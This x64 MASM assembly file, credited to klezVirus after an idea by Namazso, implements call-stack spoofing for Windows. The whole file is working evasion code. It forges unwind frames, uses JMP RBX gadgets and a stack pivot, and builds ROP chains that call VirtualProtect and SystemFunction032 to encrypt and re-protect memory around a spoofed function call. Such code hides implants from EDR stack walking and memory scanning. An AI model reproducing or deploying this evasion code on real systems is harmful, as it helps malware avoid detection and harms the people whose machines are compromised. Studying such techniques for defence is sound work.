;   ------------------------------------------------------------------------------------
;
;   Author       : klezVirus 2022
;   Twitter      : https://twitter.com/klezVirus
;   Original Idea: Namazso 
;   Twitter      : https://twitter.com/namazso
;   ------------------------------------------------------------------------------------
;   ------------------------------------------------------------------------------------

spoof_call proto
restore proto

.code

spoof_call proc
;   ------------------------------------------------------------------------------------
;   Saving non-vol registers
;   ------------------------------------------------------------------------------------
;	int 3
	
	mov     [rsp+08h], rbp
	mov     [rsp+10h], rbx
	mov     rcx, r9
	mov     r11, rcx
	call    StackSearch ; Let's pray we find it

;   ------------------------------------------------------------------------------------
;   Creating a stack reference to the JMP RBX gadget
;   ------------------------------------------------------------------------------------
	mov		rbx, [rcx+050h]
	mov     [rsp+18h], rbx
	mov		rbx, rsp
	add		rbx, 18h
	mov		[rcx+0b0h], rbx
;   ------------------------------------------------------------------------------------
;   Prolog
;   RBP -> Keeps track of original Stack
; 	RSP -> Desync Stack for Unwinding Info
;   ------------------------------------------------------------------------------------
;   Note: Everything between RSP and RBP is our new stack frame for unwinding 
;   ------------------------------------------------------------------------------------
	mov     rbp, rsp
;   ------------------------------------------------------------------------------------
;   Creating Restore Rop Chain
;   ------------------------------------------------------------------------------------
	
;	int 3
	push    rbp
	push    r12
	push    r13
	push    r14
	push    r15
	push    [r11+038h]

	mov     rbp, rsp
	add		rbp, 8 
	push    rbp
	sub		rbp, 8
	push    r10
	push    r9
	push    r8
	push    rcx	
	push    [r11+028h]
	
	push    rdx
	push    [r11+020h]
	sub     rsp, 028h
	push    [r11+030h]
	sub     rsp, 028h
	push    [r11+030h]
	
	; Virtual Protect
	push    [r11+010h]
	push    1 ; r11
	push    1 ; r10
	push    [r11+018h] ; r9
	push    020h ; r8
	push    [r11+00h] ; rcx	
	push    [r11+028h]
	push    [r11+060h] ; rdx
	push    [r11+020h]
	sub     rsp, 028h
	push    [r11+030h]
	; SystemFunction032
	push    [r11+08h]
	push    1 ; r11
	push    1 ; r10
	push    1 ; r9
	push    1 ; r8
	push    [r11+0a0h]	
	push    [r11+028h]
	push    [r11+098h]	
	push    [r11+020h]
	
	sub     rsp, 028h
	push    [r11+030h]
	; Virtual Protect
	push    [r11+010h]
	push    1 ; r11
	push    1 ; r10
	push    [r11+018h] ; r9
	push    040h ; r8
	push    [r11+00h] ; rcx	
	push    [r11+028h]
	push    [r11+060h] ; rdx
	push    [r11+020h]

;   Now RBX contains the stack pointer to Restore ROP CHAIN on the stack  
;   -> Will be called by the push RBX; ret gadget
	
	mov		rbx, [rcx+198h]
    sub     rbx, [rcx+1A0h]

_check_space:
	test	rbx, rbx
    jnz     _allocate_ret
    jmp     _allocated_ret

_allocate_ret:
    push	[rcx+1A8h]
    sub     rbx, 8
    jmp     _check_space	

_allocated_ret:
	push	[rcx+190h]
    mov		rbx, [rsp]

;   ------------------------------------------------------------------------------------
;   Starting Frames Tampering
;   ------------------------------------------------------------------------------------
;   First Frame (SET_FPREG frame)
;   ------------------------------------------------------------------------------------
	push    [rcx+040h]
	mov     rax, [rcx+070h]
	add     qword ptr [rsp], rax                                      
	
	mov     rax, [rcx+0c0h]
	sub     rax, [rcx+068h]
	
	sub     rsp, [rcx+078h]
	mov     r10, [rcx+0a8h]
	mov     [rsp+r10], rax
;   ------------------------------------------------------------------------------------
;   Second Frame (PUSH_NONVOL RBP)
;   ------------------------------------------------------------------------------------
	push    [rcx+048h]
    mov     rax, [rcx+080h]
    add     qword ptr [rsp], rax
;   ------------------------------------------------------------------------------------
;   ROP Frames
;   ------------------------------------------------------------------------------------
;   1. JMP [RBX] Gadget (To restore original Control Flow Stack)
;   ------------------------------------------------------------------------------------
	mov     rax, [rcx+090h]
	sub     rsp, [rcx+088h]
	push    [rcx+0b0h]
	sub     rsp, rax
	mov     r10, [rcx+050h]
;   Placing return address -> JMP [RBX]
;   The return offset (as the gadget size) is a function of the number of arguments
;   This is to ensure we have enough space in the frame to store all the args we need
	mov     [rsp+rax], r10
;   ------------------------------------------------------------------------------------
;   2. Stack PIVOT (To conceal our RIP and return to the JOP gadget)
;   ------------------------------------------------------------------------------------
	push    [rcx+058h]
	mov     rax, [rcx+090h]
	mov		[rbp+28h], rax
;   ------------------------------------------------------------------------------------
;   Set the pointer to the function to call in RAX
;   ------------------------------------------------------------------------------------
	mov     rax, [rcx+0b8h]
	jmp     parameter_handler
spoof_call endp
	
parameter_handler proc
	mov		r9, rax
	mov		r8, [rcx+0c8h]	
_internal_handler:
	cmp 	r8, 4
	jle     _handle_four_or_less
	mov		rax, 8
	mul		r8
;	RCX is the SPOOFER config, RCX+0A8h is the first parameter
	mov		r15, qword ptr [rcx+0D0h+rax-8]
	mov     [rsp+rax], r15
	dec     r8
	jmp     _internal_handler
_handle_four_or_less:
    xchg	r9, rax
    mov     r9, [rcx+0e8h]
    mov     r8, [rcx+0e0h]
    mov     rdx, [rcx+0d8h]
    mov     rcx, [rcx+0d0h]
	jmp     execute
parameter_handler endp
execute proc
	
	; Spoofed function
	push    rax ; <-- spoofed function
	push    r11
	push    r10
	push    r9
	push    r8
	push    rcx	
	push    [r11+028h]
	push    rdx
	push    [r11+020h]
	sub     rsp, 028h
	push    [r11+030h]
	sub     rsp, 028h
	push    [r11+030h]
	; Virtual Protect
	push    [r11+010h]
	push    1 ; r11
	push    1 ; r10
	push    [r11+018h] ; r9
	push    04h ; r8
	push    [r11+00h] ; rcx	
	push    [r11+028h]
	push    [r11+060h] ; rdx
	push    [r11+020h]
	sub     rsp, 028h
	push    [r11+030h]
	; SystemFunction032
	push    [r11+08h]
	push    1 ; r11
	push    1 ; r10
	push    1 ; r9
	push    1 ; r8
	push    [r11+0a0h]	
	push    [r11+028h]
	push    [r11+098h]	
	push    [r11+020h]
	
	sub     rsp, 028h
	push    [r11+030h]

	; Virtual Protect
	push    [r11+010h]
	push    1 ; r11
	push    1 ; r10
	push    [r11+018h] ; r9
	push    040h ; r8
	push    [r11+00h] ; rcx	
	push    [r11+028h]

	push    [r11+060h] ; rdx
	push    [r11+020h]
	; int 3
	ret
	
execute endp

; RCX - Struct with QWORD value to search for at 0C0h
; Returns:
;   RAX = offset in bytes from RSP to found address, or 0 if not found

StackSearch PROC
    mov r8, rcx
	mov rcx, [rcx+0C0h]      ; Value to search
	mov r11, rsp             ; Save current RSP
    mov r10, gs:[08h]        ; Get StackBase from TEB

    mov rdx, r11             ; RDX = search pointer (start from RSP)

search_loop:
    cmp rdx, r10             ; Have we reached StackBase?
    jae not_found            ; If yes, stop

    cmp qword ptr [rdx], rcx ; Compare memory at [RDX] with search value
    je found

    add rdx, 8               ; Move to next QWORD
    jmp search_loop

found:
    mov rax, rdx
    sub rax, r11             ; RAX = found address - RSP
	mov rcx, r8
	mov [rcx+0C0h], rax
    ret

not_found:
    xor rax, rax
	mov rcx, r8
    ret

StackSearch ENDP

end